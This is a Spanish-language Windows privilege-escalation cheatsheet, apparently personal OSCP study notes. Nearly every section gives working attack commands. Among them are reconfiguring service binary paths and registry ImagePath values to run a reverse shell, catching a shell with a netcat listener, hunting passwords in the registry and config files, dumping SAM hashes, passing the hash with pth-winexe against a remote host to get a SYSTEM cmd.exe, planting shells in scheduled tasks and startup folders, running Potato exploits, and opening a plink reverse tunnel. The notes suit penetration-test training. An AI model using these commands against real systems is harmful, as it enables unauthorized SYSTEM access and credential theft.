# Windows-Priv-Esc
Una cheatsheet con los conceptos para poder escalar privilegios en Windows.

## Índice

- [Windows-Priv-Esc](#windows-priv-esc)
     * [Service Exploits](#services-exploits)
     * [Kernel Exploits](#kernel-exploits)
     * [Password](#password)
     * [Scheduled Tasks](#scheduled-tasks)
     * [Insecures GUI Apps](#insecures-gui-apps)
     * [Startup Apps](#startup-apps)
     * [Apps Exploits](#apps-exploits)
     * [Hot Potatos](#hot-potato)
     * [Juicy Potatos](#juicy-potatos)
     * [Port Forwarding](#port-forwarding)

# Windows-Priv-Esc
Una cheatsheet con los conceptos para poder escalar privilegios en Windows.

# Windows Priv Esc
- Notas realizadas para la preparación de OSCP


## Services Exploits
- Son serivicios que corren en segundo plano si el servicios es corrido por el admin o system user y estan mal configurados pueden ser usados para escalar privilegios

```
Query la configuración de un servicio
> sc.exe qc <nombre>

Query la configuración del estado de un servicio
> sc.exe query <nombre>

Modificar la configuración de un servicio

> sc.exe config <nombre> <opción>= <valor>

Empezar o terminar un servicio

> net start/stop <nombre>

```

### Insecure Service Properties
> Los servicios tiene que tener siempre permisos de (SERVICE_QUERY_CONFIG, SERVICE_STOP, SERVICE_START, SERVICE_ALL_ACCESS y SERVICE_CHANGE_CONFIG)
> **Es importante que tengamos siempre permisos de reniciar el servicio para poder escalar los previlegios**
```
> winPEASS quiet servicesinfo

> accesschk.exe /accepteula -uwcqv user daclsvc

> sc qc daclsvc 

> sc query service

> sc config daclsvc binpath= "RUTA DONDE TENGAMOS UNA SHELL"

```
### Unquoted Service Path
- Esta missconfiguration ocurre cuando la ruta de un binario o app no tiene "" entonces se puede aprovechar para poder escalar los privilegios, ya que es como los PATH de Linux, Windows va buscando de archivo en archivo si el .exe esta en ella por lo que nosotro debemos mirar toda las rutas del archivo si tenemos permisos de escritura así poder colocar una shell con el nombre del .exe que anda buscando Windows

```
> winPEASS quiet servicesinfo 

> accesschk.exe /accepteula -ucqv user <nombre>

> accesschk.exe /accepteula -uwdq "C:\" para ir comprobando sucesivamente la rura de una en una 

> copy shell.exe C:\PROGRAM DATA\app.exe

> net start <nombre>

```


### Weak Registry Permissions
- Windows guarda registros para cada servicio, por lo que tiene un ACLs, si el ACL (Access Control List) no esta bien configurada se puede aprovechar de esta para elevar los privilegios

```
> winPEASS quiet servicesinfo

> accesschk.exe /accepteula -uvwqk REGISTRO

> accesschk.exe /accepteula -ucqv user regsvc

> reg query RUTA DEL REGISTRO para veer donde se encuentra el ImagePath

> reg add RUTA del regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\reverse.exe /f

> net start regsvc
```

### Insecure Service Executables
- Si el servicio original es modificable por un usuario normal, podemos simplemente replazar por una shell.exe **SI ESTÁS EXPLOTANDOLO EN UNA AUDITORIA RECUERDA HACER UNA BACKUP DEL SRVICIO ORIGINAL**

````
> accesschk.exe /accepteula -quvw RUTA 

> acesschk.exe /accepteula -uvqc filepermsvc

> copy /Y shell.exe "RUTA DONDE QUIERES SUSTITUIR EL SERVICIO"

> net start filepermsvc

````

### DLL Hijacking
- Un servicio siempre tratará de cargar una funcionalidad desde una DLL (dynamic-link library). El DLL siempre cargará con los privilegios del servicio, si un DLL esta cargada desde una PATH absoluta entonces es posible escalar privilegios, si también tenemos permisos de escritura. Una misconfiguración muy común son los DLL que no se encuentra en el sistema por lo que con msfvenom podemos hacer un payload con formato DLL.

```
> accesschk.exe /accepteula -uvqc user dllsvc 

> sc qc dllsvc 

> Después poner el payload en el directorio donde este la vulnerabilidad

```

## Kernel Exploits
- Los exploits de kernel tambien pueden ser usados para escalar privilegios.

```
> systeminfo // El output de este comando hay que usarlo depues con windows exploit suggester para veer si hay exploits

```
## Password
- Algunos features de windows almacena nuestras contraseñas de forma inseguros

### Registry

 - Los siguientes comandos busca en los registros (REG) valores que coincidan con la palabra clave (Password), esto normalmente nos devuelve una lista de resultados. Mirar con winPEASS Autologon credendials y Putty session
```
> reg query HKLM /f password /t REG_SZ /s //Busca localmente

> reg query KKCU /f password /t REG_SZ /s //Busca del usuario

> winPEASS quiet filesinfo usersinfo

```

> Una vez que tengamos credenciales válidas podemos usar herramientas como winexe para spawnear una cmd.exe
 ```
 > winexe -U 'admin%password' --system //10.10.10.X cmd.exe
 
 ```
 
 ### Saved Creds
 
- Windows tiene un commando de runas por lo que permite a otros usuario correr comandos con privilegios de otros. Windows tiene una opción que permite al usuario guardar contraseñas

```
> winPEASS quiet cmd windowscreds

> cmdkey /list

```

- Con las credenciales válidas podemos usar el **RUNAS**

```
> rlwrap nc -lvnp 443

> runas /savecred /user:admin C:\PrivEsc\reverse.exe

```

### Archivos de configuración

- Algunos administradores dejan archivo de cconfiguración con contraseñas válidas 

```

> dir /s *pass* == *.config

> findstr /si password *.xml *.ini *.txt

> winPEASS quiet searchfast filesinfo
```

### SAM 

- Windows almacena contraseñas hashes en la SAM o también conocido como Security Account Manager, estan encriptados, pero podemos encontrar la key en el fichero de SYSTEM

> Transladar las KEYS y los ficheros SAM a la maquina host para desencriptarlos con herramientas como **creddump7** nos dumpea luego con john o hashcat para crackear. 
- Estan usualmente almacenadas en el directorio C:\Windows\System32\config

- La backup puede estar almacenadas en C:\Windows\System32\config\Regback o C:\Windows\Repair

### Passing the Hash

- Con esta técnica podemos directamente con los hashes dumpeadas anteriormente directamente conectarnos a un usuario solo proporcionando el hash.  pth-winexe

```
> pth-winexe -U 'admin%hash' --system //10.10.10.X cmd.exe
```


## Scheduled Tasks
  
  - Windows puede estar configurado para correr tareas en un momento en concreto o cuando triggerea un evento, las tareas siempre corren con los privilegios de quien ha sido configurada la tarea //similias a las crontab, también es importante fijarse en archivos donde nos indique las tareas.

```
> schtasks /query /fo LIST /v

> accesschk.exe /accepteula -qvu // para ver los permisos 

```

- Añadimos al scirpt la ejecución de una shell a nuestra maquina host 
-> echo C:\PrivEsc\shell.exe >> TAREA 




## Insecures GUI Apps
- En las versiones antiguas del windows, el usuario podía estar asignados con los permisos de correr certos GUI apps con los privilegios de un administrador, por lo que se podía ser aprovechada para spawnear shells.

```
> tasklist /v | findstr mspaint.exe...

- En la barra de busqueda 
	> file://c:/windows/system32/cmd.exe
```

> Con esto nos hemos podido aprovecharnos de la barra de busqueda en spawnear una shell admin

## Startup Apps

- Cada usuario puede definer los apps que quieren que se ejecuten al iniciar el ordenador el directorio para ver donde se almacena todo estos datos es en C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
- Si podemos tener los permisos de escritura en este directorio podemos meter una shell en ese directorio para cuando se ejecuta cuando el ordenador es encendido

> Es necesario crear un shortcut en esa carpeta en el cuál tenemos que indicar la ejecución de nuestra shell

```
> accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

> csscript SHORTCUT.vbs

```


## Apps Exploits

- Enumerar todo los programas, usa exploitdb para veer si una app tiene un epxloit de escalada de privilegio

```

> taskslist -v

> seatbelt.exe NonstandardProcesses

> winPEASS quiet procesinfo

```


## Hot Potato

- Hot Potato es una vulnerabilidad de spoofing con un NTLM relay attack para ganar privilegios del sistema el ataque indica a Windows autendicarse como SYSTEM user a un servidor de HTTP falso usando el NTLM, entonces el NTLM es usabada en el SMB para un RCE

```

potato.exe -ip x.x.x.x -cmd "C:\PrivEsc\shell.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true

```
## Juicy Potatos

- Si el servicio tiene asignada en el un token de SeImpersonatePrivilege activada entonces es vulnerable a un juicy potat, rotten potate....

```
> whoami /priv

```

## Port Forwarding

-  Pivotear a servicios que no tengamos accesos desde la red externa 

- Editar el archivo en tu linux de /etc/ssh/sshd_config 

```
> plink.exe root@10.10.10.x -R [LPORT]:127.0.0.1:[RPORT]
> winxec -U 'admin%password123' //127.0.0.1 cmd.exe

```
